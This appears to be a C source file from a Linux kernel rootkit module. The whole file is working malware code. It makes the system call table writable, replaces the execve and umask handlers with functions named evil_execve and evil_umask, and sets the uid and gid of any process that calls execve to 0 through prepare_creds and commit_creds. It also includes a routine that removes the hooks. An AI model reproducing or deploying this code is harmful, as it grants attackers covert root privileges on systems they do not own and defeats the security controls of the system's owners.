#include "sys_escalation.h"
#include "syscall_table.h"

/* set root escalation flag */
int sys_esc_flag = 0; // if = 1 debugging

/* function pointer to default umask syscall */
asmlinkage int (*def_umask) (mode_t mask);

/* function pointer to default execve syscall */
asmlinkage int (*def_execve) (const char *filename, const char *const argv[], const char *const envp[]);

asmlinkage int evil_umask(mode_t mask)
{
  /* call the origin syscall */
  return def_umask(mask);
}

asmlinkage int evil_execve(const char *filename, const char *const argv[], const char *const envp[])
{
  if (sys_esc_flag == 1) {
    /* creating process credentials struct */
    struct cred *np;

    /* creating uid struct */
    kuid_t nuid;

    /* set uid value to 0 */
    nuid.val = 0;

    /* creating gid struct */
    kgid_t ngid;

    /* set gid value to 0 */
    ngid.val = 0;

    /* prepare credentials to task_struct of current process */
    np = prepare_creds();

    /* set new cred struct */
    np->uid = nuid;
    np->euid = nuid;
    np->gid = ngid;
    np->egid = ngid;

    /* commit creds to task_struct of current process */
    commit_creds(np);
  }

  /* call the origin syscall */
  return def_execve(filename, argv, envp);
}

void do_priv_esc(void)
{
  
  /* set pointers to origin syscalls */
  def_execve = table_ptr[__NR_execve];
  def_umask = table_ptr[__NR_umask];

  /* set the system call table writeable */
  set_sct_rw(table_ptr);

  /* hook execve and umask syscalls */
  table_ptr[__NR_execve] = evil_execve;
  table_ptr[__NR_umask] = evil_umask;

  /* set the system call table write protected */
  set_sct_ro(table_ptr);

  /* set privesc bit to 1 */
  sys_esc_flag = 1;
}

void undo_priv_esc(void)
{
  /* set the system call table writeable */
  set_sct_rw(table_ptr);

  /* rewrite the original syscall addresses */
  table_ptr[__NR_execve] = def_execve;
  table_ptr[__NR_umask] = def_umask;

  /* set the system call table write protected */
  set_sct_ro(table_ptr);

  /* set privesc bit to 0 */
  sys_esc_flag = 0;
}
